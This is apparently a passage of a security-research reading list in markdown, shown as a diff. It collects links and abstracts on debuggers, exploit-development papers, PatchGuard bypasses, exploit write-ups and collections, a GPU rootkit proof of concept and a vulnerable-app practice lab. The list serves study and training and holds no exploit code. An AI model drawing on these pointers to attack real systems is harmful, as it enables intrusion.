+    how it executes. In this presentation I will cover the basics of binary
+    manipulation and the use of debuggers to change program execution.
+
+* [HyperDbg](https://github.com/rmusser01/hyperdbg/)
+
+  * HyperDbg is a kernel debugger that leverages hardware-assisted
+    virtualization. More precisely, HyperDbg is based on a minimalistic
+    hypervisor that is installed while the system runs. Compared to traditional
+    kernel debuggers (e.g., WinDbg, SoftIce, Rasta R0 Debugger) HyperDbg is
+    completely transparent to the kernel and can be used to debug kernel code
+    without the need of serial (or USB) cables. For example, HyperDbg allows to
+    single step the execution of the kernel, even when the kernel is executing
+    exception and interrupt handlers. Compared to traditional virtual machine
+    based debuggers (e.g., the VMware builtin debugger), HyperDbg does not
+    require the kernel to be run as a guest of a virtual machine, although it is
+    as powerful.
+
+* [Paper](http://roberto.greyhats.it/pubs/ase10.pdf)
+* [xnippet](https://github.com/isislab/xnippet)
+
+  * xnippet is a tool that lets you load code snippets or isolated functions (no
+    matter the operating system they came from), pass parameters to it in
+    several formats (signed decimal, string, unsigned hexadecimal...), hook
+    other functions called by the snippet and analyze the result. The tool is
+    written in a way that will let me improve it in a future, defining new
+    calling conventions and output argument pointers.
+
+* [voltron](https://github.com/snare/voltron)
+
+  * Voltron is an extensible debugger UI toolkit written in Python. It aims to
+    improve the user experience of various debuggers (LLDB, GDB, VDB and WinDbg)
+    by enabling the attachment of utility views that can retrieve and display
+    data from the debugger host. By running these views in other TTYs, you can
+    build a customised debugger user interface to suit your needs.
+
+#### Linux
+
+* [GDB - GNU Debugger](https://www.gnu.org/software/gdb/)
+
+  * GDB, the GNU Project debugger, allows you to see what is going on `inside'
+    another program while it executes -- or what another program was doing at
+    the moment it crashed.
+
+* [PEDA](https://github.com/longld/peda)
+
+  * PEDA - Python Exploit Development Assistance for GDB
+
+* [radare2 as an alternative to gdb-peda](https://monosource.github.io/2016/10/radare2-peda)
+* [pwndbg - Making debugging suck less](https://github.com/zachriggle/pwndbg)
+
+  * A PEDA replacement. In the spirit of our good friend windbg, pwndbg is
+    pronounced pwnd-bag.
+  * Uses capstone as backend.
+
+* [gdbgui](https://github.com/cs01/gdbgui)
+
+  * A modern, browser-based frontend to gdb (gnu debugger). Add breakpoints,
+    view stack traces, and more in C, C++, Go, and Rust. Simply run gdbgui from
+    the terminal and a new tab will open in your browser.
+
+* [GEF - GDB Enhanced Features](https://github.com/hugsy/gef)
+
+  * GEF is aimed to be used mostly by exploiters and reverse-engineers. It
+    provides additional features to GDB using the Python API to assist during
+    the process of dynamic analysis or exploit development.
+  * Why not PEDA?
+  * Yes!! Why not?! PEDA is a fantastic tool to do the same, but is only to be
+    used for x86-32 or x86-64. On the other hand, GEF supports all the
+    architecture supported by GDB (x86, ARM, MIPS, PowerPC, SPARC, and so on).
+
+* [Docs](https://gef.readthedocs.org/en/latest/)
+
+#### Windows
+
+* [An Introduction to Debugging the Windows Kernel with WinDbg](http://www.contextis.com/resources/blog/introduction-debugging-windows-kernel-windbg/)
+* [Getting Started with WinDbg part 1](http://blog.opensecurityresearch.com/2013/12/getting-started-with-windbg-part-1.html)
+* [OllyDbg](http://www.ollydbg.de/)
+
+  * OllyDbg is a 32-bit assembler level analysing debugger for Microsoft®
+    Windows®. Emphasis on binary code analysis makes it particularly useful in
+    cases where source is unavailable.
+
+* [OllyDbg Tricks for Exploit Development](http://resources.infosecinstitute.com/in-depth-seh-exploit-writing-tutorial-using-ollydbg/)
+* [WinDbg](https://msdn.microsoft.com/en-us/library/windows/hardware/ff551063%28v=vs.85%29.aspx)
+* [Excellent Resource Site](http://www.windbg.org/)
+* [Crash Dump Analysis Poster](http://www.dumpanalysis.org/CDAPoster.html)
+* [Getting Started with WinDbg (User-Mode)](https://msdn.microsoft.com/en-us/library/windows/hardware/dn745911%28v=vs.85%29.aspx)
+* [Getting Started with WinDbg (Kernel-Mode)](https://msdn.microsoft.com/en-us/library/windows/hardware/dn745912%28v=vs.85%29.aspx)
+* [TWindbg](https://github.com/bruce30262/TWindbg)
+
+  * PEDA-like debugger UI for WinDbg
+
+* [WinAppDbg](http://winappdbg.sourceforge.net/)
+
+  * The WinAppDbg python module allows developers to quickly code
+    instrumentation scripts in Python under a Windows environment. It uses
+    ctypes to wrap many Win32 API calls related to debugging, and provides a
+    powerful abstraction layer to manipulate threads, libraries and processes,
+    attach your script as a debugger, trace execution, hook API calls, handle
+    events in your debugee and set breakpoints of different kinds (code,
+    hardware and memory). Additionally it has no native code at all, making it
+    easier to maintain or modify than other debuggers on Windows. The intended
+    audience are QA engineers and software security auditors wishing to test or
+    fuzz Windows applications with quickly coded Python scripts. Several ready
+    to use tools are shipped and can be used for this purposes. Current features
+    also include disassembling x86/x64 native code, debugging multiple processes
+    simultaneously and produce a detailed log of application crashes, useful for
+    fuzzing and automated testing.
+
+* [x64dbg](http://x64dbg.com/)
+* [An introduction to x64dbg](http://reverseengineeringtips.blogspot.com/2015/01/an-introduction-to-x64dbg.html)
+
+### General Exploit Development Papers
+
+* [Glibc Adventures: The Forgotten Chunks](http://www.contextis.com/documents/117/Glibc_Adventures-The_Forgotten_Chunks.pdf)
+
+  * Exploiting Glibc
+
+* [x86-64 buffer overflow exploits and the borrowed code chunks exploitation technique](http://users.suse.com/~krahmer/no-nx.pdf)
+
+  * The x86-64 CPU platform (i.e. AMD64 or Hammer) introduces new features to
+    protect against exploitation of buffer overflows, the so called No
+    Execute(NX) or Advanced Virus Protection (A VP). This non-executable
+    enforcement of data pages and the ELF64 SystemV ABI render common buffer
+    overflow exploitation techniques useless. This paper describes and analyzes
+    the protection mechanisms in depth. Research and tar get platform was a SUSE
+    Linux 9.3 x86-64 system but the results can be expanded to non-Linux systems
+    as well. search engine tag: SET-krahmer-bccet-2005.
+
+* [ROPs are for the 99% - Yang Yu](https://cansecwest.com/slides/2014/ROPs_are_for_the_99_CanSecWest_2014.pdf)
+* [Temporal Return Addresses ](http://uninformed.org/?v=all&a=9&t=sumry)
+
+  * Nearly all existing exploitation vectors depend on some knowledge of a
+    process' address space prior to an attack in order to gain meaningful
+    control of execution flow. In cases where this is necessary, exploit authors
+    generally make use of static addresses that may or may not be portable
+    between various operating system and application revisions. This fact can
+    make exploits unreliable depending on how well researched the static
+    addresses were at the time that the exploit was implemented. In some cases,
+    though, it may be possible to predict and make use of certain addresses in
+    memory that do not have static contents. This document introduces the
+    concept of temporal addresses and describes how they can be used, under
+    certain circumstances, to make exploitation more reliable.
+
+* [Modern Binary Attacks and Defences in the Windows Environment ? Fighting Against Microsoft EMET in Seven Rounds](https://drive.google.com/file/d/0B6nX_hw9OjVyVXU1OW9LbHlVRWs/view?pli=1)
+* [Reducing the Effective Entropy of GS Cookies](http://uninformed.org/?v=all&a=32&t=sumry)
+
+  * This paper describes a technique that can be used to reduce the effective
+    entropy in a given GS cookie by roughly 15 bits. This reduction is made
+    possible because GS uses a number of weak entropy sources that can, with
+    varying degrees of accuracy, be calculated by an attacker. It is important
+    to note, however, that the ability to calculate the values of these sources
+    for an arbitrary cookie currently relies on an attacker having local access
+    to the machine, such as through the local console or through terminal
+    services. This effectively limits the use of this technique to stack-based
+    local privilege escalation vulnerabilities. In addition to the general
+    entropy reduction technique, this paper discusses the amount of effective
+    entropy that exists in services that automatically start during system boot.
+    It is hypothesized that these services may have more predictable states of
+    entropy due to the relative consistency of the boot process. While the
+    techniques described in this paper do not illustrate a complete break of GS,
+    any inherent weakness can have disastrous consequences given that GS is a
+    static, compile-time security solution. It is not possible to simply
+    distribute a patch. Instead, applications must be recompiled to take
+    advantage of any security improvements. In that vein, the paper proposes
+    some solutions that could be applied to address the problems that are
+    outlined.
+
+* [OS X Kernel-mode Exploitation in a Weekend](http://uninformed.org/?v=all&a=37&t=sumry)
+
+  * Apple's Mac OS X operating system is attracting more attention from users
+    and security researchers alike. Despite this increased interest, there is
+    still an apparent lack of detailed vulnerability development information for
+    OS X. This paper will attempt to help bridge this gap by walking through the
+    entire vulnerability development process. This process starts with
+    vulnerability discovery and ultimately finished with a remote code
+    execution. To help illustrate this process, a real vulnerability found in
+    the OS X wireless device driver is used.
+
+* [Getting out of Jail: Escaping Internet Explorer Protected Mode](http://uninformed.org/?v=all&a=39&t=sumry)
+
+  * With the introduction of Windows Vista, Microsoft has added a new form of
+    mandatory access control to the core operating system. Internally known as
+    "integrity levels", this new addition to the security manager allows
+    security controls to be placed on a per-process basis. This is different
+    from the traditional model of per-user security controls used in all prior
+    versions of Windows NT. In this manner, integrity levels are essentially a
+    bolt-on to the existing Windows NT security architecture. While the idea is
+    theoretically sound, there does exist a great possibility for implementation
+    errors with respect to how integrity levels work in practice. Integrity
+    levels are the core of Internet Explorer Protected Mode, a new "low-rights"
+    mode where Internet Explorer runs without permission to modify most files or
+    registry keys. This places both Internet Explorer and integrity levels as a
+    whole at the forefront of the computer security battle with respect to
+    Windows Vista.
+
+* [Context-keyed Payload Encoding](http://uninformed.org/?v=all&a=42&t=sumry)
+
+  * A common goal of payload encoders is to evade a third-party detection
+    mechanism which is actively observing attack traffic somewhere along the
+    route from an attacker to their target, filtering on commonly used payload
+    instructions. The use of a payload encoder may be easily detected and
+    blocked as well as opening up the opportunity for the payload to be decoded
+    for further analysis. Even so-called keyed encoders utilize easily
+    observable, recoverable, or guessable key values in their encoding
+    algorithm, thus making decoding on-the-fly trivial once the encoding
+    algorithm is identified. It is feasible that an active observer may make use
+    of the inherent functionality of the decoder stub to decode the payload of a
+    suspected exploit in order to inspect the contents of that payload and make
+    a control decision about the network traffic. This paper presents a new
+    method of keying an encoder which is based entirely on contextual
+    information that is predictable or known about the target by the attacker
+    and constructible or recoverable by the decoder stub when executed at the
+    target. An active observer of the attack traffic however should be unable to
+    decode the payload due to lack of the contextual keying information.
+
+* [Automating Mimicry Attacks Using Static Binary Analysis](https://www.usenix.org/legacy/events/sec05/tech/full_papers/kruegel/kruegel_html/attack.html)
+
+  * Intrusion detection systems that monitor sequences of system calls have
+    recently become more sophisticated in defining legitimate application
+    behavior. In particular, additional information, such as the value of the
+    program counter and the configuration of the program's call stack at each
+    system call, has been used to achieve better characterization of program
+    behavior. While there is common agreement that this additional information
+    complicates the task for the attacker, it is less clear to which extent an
+    intruder is constrained. In this paper, we present a novel technique to
+    evade the extended detection features of state-of-the-art intrusion
+    detection systems and reduce the task of the intruder to a traditional
+    mimicry attack. Given a legitimate sequence of system calls, our technique
+    allows the attacker to execute each system call in the correct execution
+    context by obtaining and relinquishing the control of the application's
+    execution flow through manipulation of code pointers. We have developed a
+    static analysis tool for Intel x86 binaries that uses symbolic execution to
+    automatically identify instructions that can be used to redirect control
+    flow and to compute the necessary modifications to the environment of the
+    process. We used our tool to successfully exploit three vulnerable programs
+    and evade detection by existing state-of-the-art system call monitors. In
+    addition, we analyzed three real-world applications to verify the general
+    applicability of our techniques.
+
+* [Anti-Virus Software Gone Wrong](http://uninformed.org/?v=all&a=21&t=sumry)
+
+  * Anti-virus software is becoming more and more prevalent on end-user
+    computers today. Many major computer vendors (such as Dell) bundle
+    anti-virus software and other personal security suites in the default
+    configuration of newly-sold computer systems. As a result, it is becoming
+    increasingly important that anti-virus software be well-designed, secure by
+    default, and interoperable with third-party applications. Software that is
+    installed and running by default constitutes a prime target for attack and,
+    as such, it is especially important that said software be designed with
+    security and interoperability in mind. In particular, this article provides
+    examples of issues found in well-known anti-virus products. These issues
+    range from not properly validating input from an untrusted source
+    (especially within the context of a kernel driver) to failing to conform to
+    API contracts when hooking or implementing an intermediary between
+    applications and the underlying APIs upon which they rely. For popular
+    software, or software that is installed by default, errors of this sort can
+    become a serious problem to both system stability and security. Beyond that,
+    it can impact the ability of independent software vendors to deploy
+    functioning software on end-user systems.
+
+* [Sigreturn Oriented Programming is a real Threat](https://subs.emis.de/LNI/Proceedings/Proceedings259/2077.pdf)
+
+  * Abstract: This paper shows that Sigreturn Oriented Programming (SROP), which
+    consists of using calls to sigreturn to execute arbitrary code, is a pow
+    erful method for the de velopment of exploits. This is demonstrated by
+    developing two different kinds of SROP based exploits, one asterisk exploit
+    which was already portrayed in the paper presenting SROP, and one novel
+    exploit for a recently disclosed bug inthe DNS address resolution of the
+    default GNUC library. Taking advantage of the fact, that these exploits have
+    very few dependencies on the program being exploited, a library is
+    implemented to automate wide parts of SROP exploit creation. This highlights
+    the potential of SROP in respect to reusable and portable exploit code which
+    strongly supports the conclusion of the original paper: SROP is areal
+    threat!
+
+* [Breaking the links: Exploiting the linker](https://www.nth-dimension.org.uk/pub/BTL.pdf)
+* [nt!_SEP_TOKEN_PRIVILEGES - Single Write EoP Protect - Kyriakos 'kyREcon' Economou](http://anti-reversing.com/Downloads/Sec_Research/ntoskrnl_v10.0.15063_nt!_SEP_TOKEN_PRIVILEGES-Single_Write_EoP_Protect.pdf)
+
+  * TL;DR: Abusing enabled token privileges through a kernel exploit to gain EoP
+    it won't be enough anymore as from NT kernel version 10.0.15063 are
+    'checked' against the privileges present in the token of the calling
+    process. So you will need two writes
+
+### Miscellaneous Exploit Writeups
+
+* [REMath](https://github.com/REMath/literature_review)
+* [Exploiting the DRAM rowhammer bug to gain kernel privileges](http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)
+
+  * "Rowhammer is a problem with some recent DRAM devices in which repeatedly
+    accessing a row of memory can cause bit flips in adjacent rows. We tested a
+    selection of laptops and found that a subset of them exhibited the problem.
+    We built two working privilege escalation exploits that use this effect. One
+    exploit uses rowhammer-induced bit flips to gain kernel privileges on x86-64
+    Linux when run as an unprivileged userland process. When run on a machine
+    vulnerable to the rowhammer problem, the process was able to induce bit
+    flips in page table entries (PTEs). It was able to use this to gain write
+    access to its own page table, and hence gain read-write access to all of
+    physical memory.
+
+* [Program for testing for the DRAM "rowhammer" problem](https://github.com/google/rowhammer-test)
+* [ADI vs ROP](https://lazytyped.blogspot.it/2017/09/adi-vs-rop.html)
+* [shadow :: De Mysteriis Dom jemalloc](https://github.com/CENSUS/shadow)
+
+  * shadow is a jemalloc heap exploitation framework. It has been designed to be
+    agnostic of the target application that uses jemalloc as its heap allocator
+    (be it Android's libc, Firefox, FreeBSD's libc, standalone jemalloc, or
+    whatever else). The current version (2.0) has been tested extensively with
+    the following targets: Android 6 and 7 libc (ARM32 and ARM64); Firefox (x86
+    and x86-64) on Windows and Linux;
+
+* [Overview of Android's jemalloc structures using shadow](https://github.com/CENSUS/shadow/blob/master/docs/android_heap.md)
+
+  * In this document we explore Android's jemalloc structures using shadow. A
+    simplified view of the heap is presented here. The intention of this
+    document is to get you started with jemalloc structures and shadow's
+    commands.
+
+#### Talks
+
+* [Advanced PDF Tricks - Ange Albertini, Kurt Pfeifle - [TROOPERS15]](https://www.youtube.com/watch?v=k9g9jZdjRcE)
+* [Extreme Privelege Escalataion on Windows8 UEFI Systems](https://www.youtube.com/watch?v=UJp_rMwdyyI)
+
+  * [Slides](https://www.blackhat.com/docs/us-14/materials/us-14-Kallenberg-Extreme-Privilege-Escalation-On-Windows8-UEFI-Systems.pdf)
+  * Summary by stormehh from reddit: In this whitepaper (and accompanying
+    Defcon/Blackhat presentations), the authors demonstrate vulnerabilities in
+    the UEFI "Runtime Service" interface accessible by a privileged userland
+    process on Windows 8. This paper steps through the exploitation process in
+    great detail and demonstrates the ability to obtain code execution in SMM
+    and maintain persistence by means of overwriting SPI flash
+
+#### Writeups that are blogposts/Similar
+
+* [It All Swings Around - Malicious Macros](http://sketchymoose.blogspot.com/2015/02/it-all-swings-round-malicious-macros.html)
+
+  * Writeup and explanation of random Macro exploits
+
+* [Adventures in Xen Exploitation](https://www.nccgroup.com/en/blog/2015/02/adventures-in-xen-exploitation/)
+
+  * "This post is about my experience trying to exploit the Xen SYSRET bug
+    (CVE-2012-0217)."
+
+* [Exploiting MS14-066](http://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/)
+* [Shellshock bug writeup by lcamtuf](http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html)
+* [Linux Kernel < 2.6.36.2 Econet Privilege Escalation Exploit](http://eshunrd.blogspot.com/2011/09/linux-kernel-26362-econet-privilege.html)
+* [Coding Malware for Fun and Not for Profit (Because that would be illegal)](http://www.malwaretech.com/2014/04/coding-malware-for-fun-and-not-for.html)
+* [Exploiting BadIRET vulnerability - CVE-2014-9322, Linux kernel privilege escalation](http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/)
+* [Exploiting CVE-2015-0311: A Use-After-Free in Adobe Flash Player](http://blog.coresecurity.com/2015/03/04/exploiting-cve-2015-0311-a-use-after-free-in-adobe-flash-player/)
+
+  * "The vulnerability was first discovered as a zero-day being actively
+    exploited in the wild as part of the Angler Exploit Kit. Although the
+    exploit code was highly obfuscated using the SecureSWF obfuscation tool,
+    malware samples taking advantage of this vulnerability became publicly
+    available, so I decided to dig into the underlying vulnerability in order to
+    exploit it and write the corresponding module for Core Impact Pro and Core
+    Insight."
+
+* [A Technical Analysis of CVE 2014-1776](http://blog.fortinet.com/post/a-technical-analysis-of-cve-2014-1776)
+* [Diving into A Silverlight Exploit and Shellcode - Analysis and Techniques](http://www.checkpoint.com/downloads/partners/TCC-Silverlight-Jan2015.pdf)
+
+  * Abstract: We will observe how the exploit is obfuscated; how it loads parts
+    of the code dynamically into the memory in order to reduce the chances of
+    being detected by signature based protections and how to extract these
+    components from the exploit. In addition we will look at the shell-code
+    supplied by the exploit-kit and how it uses encryption to hide the payload's
+    URL and contents.
+
+* [Owning Internet Printing - A Case Study in Modern Software Exploitation](https://googleprojectzero.blogspot.com/2015/06/owning-internet-printing-case-study-in.html?m=1)
+* [The Chakra Exploit and the Limitations of Modern Mitigation Techniques](https://www.endgame.com/blog/chakra-exploit-and-limitations-modern-mitigation-techniques)
+* [EnglishmansDentist Exploit Analysis](https://blogs.technet.microsoft.com/srd/2017/07/20/englishmansdentist-exploit-analysis/)
+* [Dangerous Clipboard: Analysis of the MS15-072 Patch](http://blog.talosintel.com/2015/10/dangerous-clipboard.html?m=1)
+* [MS16-039 - "Windows 10" 64 bits Integer Overflow exploitation by using GDI objects](https://www.coresecurity.com/blog/ms16-039-windows-10-64-bits-integer-overflow-exploitation-by-using-gdi-objects)
+* [The Weak Bug - Exploiting a Heap Overflow in VMware](http://acez.re/the-weak-bug-exploiting-a-heap-overflow-in-vmware/)
+* [MS17-010](https://github.com/worawit/MS17-010)
+* [CVE-2016-7255 - Git repo](https://github.com/mwrlabs/CVE-2016-7255)
+* [Hijacking Arbitrary .NET Application Control Flow](https://www.tophertimzen.com/resources/grayStorm/HijackingArbitraryDotnetApplicationControlFlow.pdf)
+
+  * This paper describes the use of Reflection in .NET and how it can be
+    utilized to change the control flow of an arbitrary application at runtime.
+    A tool, Gray Storm, will be introduced that can be injected into an
+    AppDomain and used to control the executing assembly instructions after
+    just-in-time compilation.
+
+* [Dissecting Veil-Evasion Powershell Payloads and Converting to a Bind Shell](http://threat.tevora.com/dissecting-veil-evasion-powershell-payloads-and-converting-to-a-bind-shell/)
+
+##### Broadpwn
+
+* [A cursory analysis of @nitayart's Broadpwn bug (CVE-2017-9417)](http://boosterok.com/blog/broadpwn/)
+* [Emulation and Exploration of BCM WiFi Frame Parsing using LuaQEMU](https://comsecuris.com/blog/posts/luaqemu_bcm_wifi/)
+* [Broadpwn: Remotely Compromising Android and iOS via a Bug in Broadcom’s Wi-Fi Chipsets](https://blog.exodusintel.com/2017/07/26/broadpwn/)
+* [Crashing phones with Wi-Fi: Exploiting nitayart's Broadpwn bug (CVE-2017-9417)](http://boosterok.com/blog/broadpwn2/)
+
+#### Writeups that are Papers
+
+* [MALLOC DES-MALEFICARUM - blackngel](http://phrack.org/issues/66/10.html)
+* [Smashing the Heap with Vector: Advanced Exploitation Technique in Recent Flash Zero-day Attack](https://0b3dcaf9-a-62cb3a1a-s-sites.googlegroups.com/site/zerodayresearch/smashing_the_heap_with_vector_Li.pdf)
+* [Exploiting CVE-2014-4113 on Win8.1](http://www.jodeit.org/research/Exploiting_CVE-2014-4113_on_Windows_8.1.pdf)
+* [The Userland Exploits of Pangu 8](http://blog.pangu.io/wp-content/uploads/2015/03/CanSecWest2015_Final.pdf)
+* [Debugging Windows kernel under VMWare using IDA's GDB debugger](https://cyberview.files.wordpress.com/2010/09/gdb_vmware_winkernel.pdf)
+* [Pandora's Cash Box - The Ghost under your POS - RECON2015](https://recon.cx/2015/slides/recon2015-17-nitay-artenstein-shift-reduce-Pandora-s-Cash-Box-The-Ghost-Under-Your-POS.pdf)
+* [Smashing the Browser](https://github.com/demi6od/Smashing_The_Browser)
+
+  * Smashing The Browser: From Vulnerability Discovery To Exploit
+  * Writeup: going from fuzzing to an IE11 0day exploit development
+
+* [Pwning Adobe Reader with XFA](http://siberas.de/presentations/SyScan360_2016_-_Pwning_Adobe_Reader_with_XFA.pdf)
+* [Hello MS08-067, My Old Friend!](https://labs.mwrinfosecurity.com/assets/BlogFiles/hello-ms08-067-my-old-friend.pdf)
+* [EXPLOITING BUFFER OVERFLOWS ON MIPS ARCHITECTURE](https://www.exploit-db.com/docs/39658.pdf)
+* [The Birth of a Complete IE11 Exploit Under the New Exploit Mitigations](https://www.syscan.org/index.php/download/get/aef11ba81927bf9aa02530bab85e303a/SyScan15%20Yuki%20Chen%20-%20The%20Birth%20of%20a%20Complete%20IE11%20Exploit%20Under%20the%20New%20Exploit%20Mitigations.pdf)
+* [Modern Objective-C Exploitation Techniques](http://www.phrack.com/papers/modern_objc_exploitation.html)
+* [A New CVE-2015-0057 Exploit Technology](https://www.exploit-db.com/docs/39660.pdf)
+* [PLASMA PULSAR](https://github.com/stealth/plasmapulsar/blob/master/README.md) \*
+  This document describes a generic root exploit against kde.
+* [Exploiting Memory Corruption Vulnerabilities in the Java Runtime](https://media.blackhat.com/bh-ad-11/Drake/bh-ad-11-Drake-Exploiting_Java_Memory_Corruption-WP.pdf)
+* [Fun with info leaks](https://rh0dev.github.io/blog/2015/fun-with-info-leaks/)
+* [PatchGuard Reloaded: A Brief Analysis of PatchGuard Version 3](http://uninformed.org/?v=all&a=38&t=sumry)
+
+  * Since the publication of previous bypass or circumvention techniques for
+    Kernel Patch Protection (otherwise known as "PatchGuard"), Microsoft has
+    continued to refine their patch protection system in an attempt to foil
+    known bypass mechanisms. With the release of Windows Server 2008 Beta 3, and
+    later a full-blown distribution of PatchGuard to Windows Vista and Windows
+    Server 2003 via Windows Update, Microsoft has introduced the next generation
+    of PatchGuard to the general public ("PatchGuard 3"). As with previous
+    updates to PatchGuard, version three represents a set of incremental changes
+    that are designed to address perceived weaknesses and known bypass vectors
+    in earlier versions. Additionally, PatchGuard 3 expands the set of kernel
+    variables that are protected from unauthorized modification, eliminating
+    several mechanisms that might be used to circumvent PatchGuard while
+    co-existing (as opposed to disabling) it. This article describes some of the
+    changes that have been made in PatchGuard 3. This article also proposes
+    several new techniques that can be used to circumvent PatchGuard's defenses.
+    Countermeasures for these techniques are also discussed.
+
+* [Subverting PatchGuard Version 2](http://uninformed.org/?v=all&a=28&t=sumry)
+
+  * Windows Vista x64 and recently hotfixed versions of the Windows Server 2003
+    x64 kernel contain an updated version of Microsoft's kernel-mode patch
+    prevention technology known as PatchGuard. This new version of PatchGuard
+    improves on the previous version in several ways, primarily dealing with
+    attempts to increase the difficulty of bypassing PatchGuard from the
+    perspective of an independent software vendor (ISV) deploying a driver that
+    patches the kernel. The feature-set of PatchGuard version 2 is otherwise
+    quite similar to PatchGuard version 1; the SSDT, IDT/GDT, various MSRs, and
+    several kernel global function pointer variables (as well as kernel code)
+    are guarded against unauthorized modification. This paper proposes several
+    methods that can be used to bypass PatchGuard version 2 completely.
+    Potential solutions to these bypass techniques are also suggested.
+    Additionally, this paper describes a mechanism by which PatchGuard version 2
+    can be subverted to run custom code in place of PatchGuard's system
+    integrity checking code, all while leaving no traces of any kernel patching
+    or custom kernel drivers loaded in the system after PatchGuard has been
+    subverted. This is particularly interesting from the perspective of using
+    PatchGuard's defenses to hide kernel mode code, a goal that is (in many
+    respects) completely contrary to what PatchGuard is designed to do.
+
+* [Bypassing PatchGuard on Windows x64](http://uninformed.org/?v=all&a=14&t=sumry)
+
+  * The version of the Windows kernel that runs on the x64 platform has
+    introduced a new feature, nicknamed PatchGuard, that is intended to prevent
+    both malicious software and third-party vendors from modifying certain
+    critical operating system structures. These structures include things like
+    specific system images, the SSDT, the IDT, the GDT, and certain critical
+    processor MSRs. This feature is intended to ensure kernel stability by
+    preventing uncondoned behavior, such as hooking. However, it also has the
+    side effect of preventing legitimate products from working properly. For
+    that reason, this paper will serve as an in-depth analysis of PatchGuard's
+    inner workings with an eye toward techniques that can be used to bypass it.
+    Possible solutions will also be proposed for the bypass techniques that are
+    suggested.
+
+### Attacking AntiVirus
+
+* [Kaspersky Hooking Engine Analysis](https://quequero.org/2014/10/kaspersky-hooking-engine-analysis/)
+* [AV_Kernel_Vulns](https://github.com/bee13oy/AV_Kernel_Vulns)
+* Pocs for Antivirus Software‘s Kernel Vulnerabilities
+
+### Finding Vulnerabilities
+
+* Look at fuzzing section.
+
+* [Winmerge](http://winmerge.org/)
+
+  * WinMerge is an Open Source differencing and merging tool for Windows.
+    WinMerge can compare both folders and files, presenting differences in a
+    visual text format that is easy to understand and handle.
+
+* [Analyzing Common Binary Parser Mistakes](http://uninformed.org/?v=all&a=12&t=sumry)
+
+  * With just about one file format bug being consistently released on a weekly
+    basis over the past six to twelve months, one can only hope developers would
+    look and learn. The reality of it all is unfortunate; no one cares enough.
+    These bugs have been around for some time now, but have only recently gained
+    media attention due to the large number of vulnerabilities being released.
+    Researchers have been finding more elaborate and passive attack vectors for
+    these bugs, some of which can even leverage a remote compromise.
+
+#### Finding and analyzing Crash dumps
+
+* [All the Ways to Capture a Crash Dump](http://blogs.msdn.com/b/pfedev/archive/2008/09/26/all-the-ways-to-capture-a-dump.aspx)
+* [Basic Debugging of an Application Crash](http://blogs.technet.com/b/askperf/archive/2007/05/29/basic-debugging-of-an-application-crash.aspx)
+* [Collecting User Mode Dumps](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb787181(v=vs.85).aspx>)
+
+#### High Level Searching
+
+##### Searching Github for vulnerable code/credentials
+
+* [Blogpost](http://blog.conviso.com.br/2013/06/github-hacking-for-fun-and-sensitive.html)
+* [Code - Automated Tool](https://github.com/convisoappsec/research_github_hack/blob/master/github_hack.pl)
+* [Cheatsheet](https://github.com/search#search_cheatsheet_pane)
+* [Actual Search Page](https://github.com/search)
+
+### Online Resources
+
+* [ropshell](http://ropshell.com/)
+
+  * ropshell is a free online service for generating and searching for
+    Return-Oriented-Programming (ROP) gadgets.fi8ter8
+
+### Exploit Collections
+
+* [XiphosResearch PoC Exploits](https://github.com/XiphosResearch/exploits)
+
+  * Miscellaneous proof of concept exploit code written at Xiphos Research for
+    testing purposes.
+
+* [exploit-db.org](https://www.exploit-db.org)
+
+### Anti-Exploit Development
+
+* [BuBBle: A Javascript Engine Level Countermeasure against Heap-Spraying Attacks](http://cd80.ca/files/bubble.pdf)
+
+  * Abstract. Web browsers that support a safe language such as Javascript are
+    becoming a platform of great interest for security attacks. One such attack
+    is a heap-spraying attack: a new kind of attack that combines the
+    notoriously hard to reliably exploit heap-based buffer overflow with the use
+    of an in-browser script- ing language for improved r eliability. A typical
+    heap-s praying attack allocates a high number of objects containing the
+    attacker’s code on the heap, dramatically increasing the probability that
+    the contents of one of these objects is executed. In this paper we present a
+    lightweight approach that makes heap-spraying attacks in Javascript
+    significantly harder. Our prototype, which is implemented in Firefox, has a
+    negligible performance and memory overhead while effectively protecting
+    against heap-spraying attacks.
+
+### GPU Exploits / Research
+
+* [A Study of Overflow Vulnerabilities on GPUs](https://www.aimlab.org/haochen/papers/npc16-overflow.pdf)
+* [Jellyfish - GPU rootkit PoC by Team Jellyfish ](https://github.com/x0r1/jellyfish)
+
+  * Jellyfish is a Linux based userland gpu rootkit proof of concept project
+    utilizing the LD_PRELOAD technique from Jynx (CPU), as well as the OpenCL
+    API developed by Khronos group (GPU). Code currently supports AMD and NVIDIA
+    graphics cards. However, the AMDAPPSDK does support Intel as well.
+
+### Exploit Development Practice Lab Setup
+
+```
+Building a Lab to practice Exploit writing
+
+
+
+So, this is a thing I found while doing some googling. If you wrote this, I owe you a lot of beer. I redacted the place/username as it was on a less than happy place.
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+This assumes you have an idea of ASM x86 and general exploitation methods.
+
+Idea with this setup, is that you have a VM of XP SP3 running with the following software and tools installed. You look up the exploits on exploit-db and recreate them. Or you lookup the vulnerabilities and fuzz it yourself knowing where to look.
+
+
+Start here:
+I'm designing exploit lab based on WinXP SP3. As for now I have following vulnerabilities/apps:
+
+1. Simple RET - Ability FTP Server (FTP)
+2. Simple RET - FreeFloat FTP (FTP)
+3. Simple RET (harder) - CesarFTP (FTP)
+4. Simple RET - Easy RM to MP3 Converter (.pls)
+5. Simple RET - DL-10 - Need to find copy of
+6. SEH - DVDXPlayer
+7. SEH - Millenium
+8. SEH - Soritong
+9. SEH - mp3nator
+10. SEH - NNM (hard) - Need to find copy of
+11. SEH + UNICODE - ALLPlayer
+12. SEH (difficult) - Winamp
+
+with following tools installed:
+
+1. WinDBG + MSEC.dll (!load winext\msec.dll) + byakugan (!load byakugan)
+2. Immunity Debugger + mona.py (!mona)
+3. OllyDBG+Plugins(SSEH+OllySnake+AdvancedOlly+OllyHeapVis+Virtual2Physical)
+4. C:\Windows\system32\findjmp2.exe
+5. Cygwin + perl + gdb + gcc...
+6. Python26 (for IDA) + PyDbg - https://code.google.com/p/pydbgr/wiki/HowToInstall
